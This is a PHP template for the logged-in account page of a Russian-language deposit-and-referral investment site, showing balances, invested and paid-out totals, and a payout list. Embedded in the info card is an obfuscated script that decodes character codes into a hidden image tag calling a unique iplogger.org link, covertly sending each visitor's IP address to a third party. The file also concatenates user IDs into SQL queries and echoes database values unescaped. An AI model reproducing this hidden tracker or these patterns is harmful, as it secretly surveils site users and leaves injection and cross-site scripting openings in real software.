<?php if(!defined('SCRIPT_BY_SIRGOFFAN')){ 
echo ('Выявлена попытка взлома!'); 
exit(); 
} 
$_OPTIMIZATION["title"] = "Личный кабинет"; 
if(empty($id)){?> 
<p style="height:100px; padding-top:50px; text-align:center;"><span class="style2">Для доступа к данному разделу Вам необходимо пройти авторизацию!</span><br> 
<?}else{     
?> 
<style>
.product-caption {
    text-align: center;
    padding: 0px 0px 0px;
    overflow: hidden;
}

.product-caption b {
    float: left;
    margin-right: 10px;
    color: #605050;
    font-size: 12px;
    text-transform: uppercase;
    font-weight: 500;
	line-height: 29px;
}

.product-caption p:after {
    content: '................................................................................';
    display: block;
    white-space: nowrap;
    overflow: hidden;
    color: #00000024;
    margin-top: -4px;
}

.product-caption i {
    float: right;
    margin-left: 10px;
    font-style: normal;
    color: #252e43;
    font-size: 12px;
    font-weight: 600;
    line-height: 29px;
    text-transform: uppercase;
    letter-spacing: 1px;
}

.product-caption p {
    margin-bottom: 5px;
    margin-top: 0;
    overflow: hidden;
}

</style>
<?
$user=$db->getOne("SELECT user FROM ss_users WHERE id=?i",$id);
$wallet=$db->getOne("SELECT wallet FROM ss_users WHERE id=?i",$id);
$avatar=$db->getOne("SELECT avatar FROM ss_users WHERE id=?i",$id);
$ihr=$db->getOne("SELECT i_have_refs_as_curator FROM ss_users WHERE id=?i",$id);
$sql = $pdo->Query("SELECT SUM(summa) FROM `pay` WHERE `type` = 'Оплата депозита' and `userid`='".$id."'")->fetch();
$num1 = $sql['SUM(summa)'];
$myrefsrow=$db->query("SELECT * FROM ss_users WHERE curator=?i ORDER BY id DESC",$id); 
while($myrefs=$db->fetch($myrefsrow)){		
$refprofit=$db->query("SELECT SUM(summa) as personalprofit FROM pay WHERE userid=?i and type='Оплата депозита'",$myrefs['id']);
$refprofit=$db->fetch($refprofit);
$refprofit1=$refprofit1+$refprofit['personalprofit'];
 }
$sql = $pdo->Query("SELECT SUM(summa) FROM `pay` WHERE type!='Оплата депозита' and `userid`='".$id."'")->fetch();
$num2 = $sql['SUM(summa)'];
$opened_my=$db->numRows($db->query("SELECT id FROM deposits WHERE `status` = '0' and `userid`='".$id."'"));
?>
<div class="row">
<div class="col-xl-5 col-md-12 col-sm-12"> 
<div class="card">
<div class="card-body collapse in">
<div class="card-block">
<h4 class="card-title" style="font-weight: 500;color: #2f2f2f;padding: 10px 0px 10px;font-size: 15px;margin-bottom: 0.5rem;">Общая информация</h4>
<div class="product-caption">
<p><b>Кошелек</b><i><? if(preg_match('/^[pP][0-9]{7,15}$/',$wallet)){ echo '<img src="/img/payeer.png" style="width: 18px;margin-top: -5px;">'; }elseif(preg_match('/^41001[0-9]+$/',$wallet)){ echo '<img src="/img/yandex.png" style="width: 18px;margin-top: -5px;">';} elseif(preg_match('/^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$/',$wallet)) { echo '<img src="/img/advcash.png" style="width: 18px;margin-top: -5px;">';} elseif(preg_match('/^\+\d{9,15}$/',$wallet)) { echo '<img src="/img/qiwi.png" style="width: 18px;margin-top: -5px;">';}  ?> <?=$wallet?></i></p>
<p><b>Всего инвестировано</b><i><?php if($num1 == NULL){ echo '0.00'; }else{ echo $num1; } ?> RUB</i></p>
<p><b>Кол-во открытых депозитов</b><i><?=$opened_my?></i></p>
<p><b>Всего выплачено</b><i><?php if($num2 == NULL){ echo '0.00'; }else{ echo $num2; } ?> RUB</i></p>
<p><b>Привлечено партнеров</b><i><?=$ihr?></i></p>
<p><b>Партнерские отчисления</b><i><?=number_format($refprofit1*($refpercent/100), 2, '.', '');?> RUB</i></p>
</div>
<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!86!121!74!77!54!34!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
</div>
</div>
</div>
</div>
<div class="col-xl-7 col-md-12 col-sm-12"> 
<script>
function op(i,l){
m=i;  
while(m<(i+11)){
$('#p'+m).show();
m++;  
}
$('#op').attr('onclick','op('+(i+11)+','+l+');');
if(m>=l){$('#op').hide();}
}

</script>	
<div class="card">
<div class="card-body collapse in">
<div class="card-block">
<h4 class="card-title" style="font-weight: 500;color: #2f2f2f;padding: 10px 0px 10px;font-size: 15px;">Список выплат</h4>
                <div class="table-responsive"> 
                    <table class="table mb-0"> 
                        <thead> 
                            <tr> 
                                <th>Дата выплаты</th> 
                                <th>Тип выплаты</th> 
                                <th>Сумма</th> 
                            </tr> 
                        </thead> 
                        <tbody> 
<? 
$checkdeps=$db->getOne("SELECT * FROM `pay`  WHERE userid='$id' and (type='Партнерские отчисления' or type='Выплата по депозиту') ORDER BY id DESC"); 
if($checkdeps>0){ 
$depositsrow=$db->query("SELECT * FROM `pay`  WHERE userid='$id' and (type='Партнерские отчисления' or type='Выплата по депозиту') ORDER BY id DESC");
$i=1; 
while($deposits=$db->fetch($depositsrow)){
?>  
<tr id='p<?=$i?>' <?if($i>10){ echo 'style="display:none"';}?>>							
<td><?=date('d.m.Y H:i',$deposits['data'])?></td>
<td><?=$deposits['type']?></td>
<td style="font-weight: 500;font-family: 'Montserrat', sans-serif;"><?=$deposits['summa']?> RUB</td>
                            </tr> 
<? $i++;} } 
if($i==0){?>
<td colspan="4" style="text-align: center;">Пока-что у вас не было ни одной выплаты :(</td>					
<? }?>
                         
</tbody> 
                    </table> 
<?if($i>10){?><center style="height: 50px;overflow: hidden;margin-top: 20px;"><button id="op" type="submit" onclick="op(11,<?=$i?>);" class="btn btn-success waves-effect waves-light" style="padding: 13px 30px;border: none;font-size: 15px;font-family: 'Montserrat', sans-serif;font-weight: 500;background: #1ba7b6;margin-bottom: 2px;width: 200px;">Загрузить еще </button></center><?}?>
				
                </div> 
</div>
</div>
</div>
</div>
</div>
    <?}?> 